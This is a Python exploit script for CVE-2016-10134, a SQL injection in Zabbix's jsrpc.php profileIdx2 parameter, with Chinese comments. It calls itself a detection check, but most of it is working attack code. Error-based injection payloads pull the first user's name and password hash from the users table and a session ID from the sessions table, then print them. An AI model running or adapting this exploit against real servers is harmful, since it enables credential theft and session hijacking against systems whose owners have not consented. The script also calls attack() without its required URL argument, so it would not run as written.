# -*- coding: utf-8 -*-
import re
import requests


'''
Usage:
    moon.py -u  zabbix http://x.x.x.x:xx
    zabbix的 profileIdx2 参数存在问题，存在sql注入。
    影响范围，3.0.3 成功，  3.2.6 失败。
    禁用guest账户，升级版本
'''

def attack(URL):
    print('[+]开始检测-zabbix_sql-CVE-2016-10134。[+]')
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}
    url = URL + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        res = requests.get(url,headers=headers)
        xresponse = res.text
        print('访问URL成功，开始进行zabbix_sql注入漏洞检测。')
    except:
        print('[-]未发现zabbix_sql注入漏洞。')
    else:
        try:
            url = URL + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            res = requests.get(url, headers=headers)
            response = res.text
            result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            results = result_reg.findall(response)
            print('管理员、用户名密码为：'+results[0])
        except:
            print('[-]获取用户名及密码失败。')
        try:
            url = URL + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&updateProfile=true&screenitemid=.=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
            res = requests.get(url, headers=headers)
            response = res.text
            result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
            results = result_reg.findall(response)
            print('SessionID为：' + results[0])
        except:
            print('[-]获取SessionID失败。')
    print('[+]检测结束-zabbix_sql-CVE-2016-10134。[+]')
    print('\n')


if __name__ == '__main__':
    attack()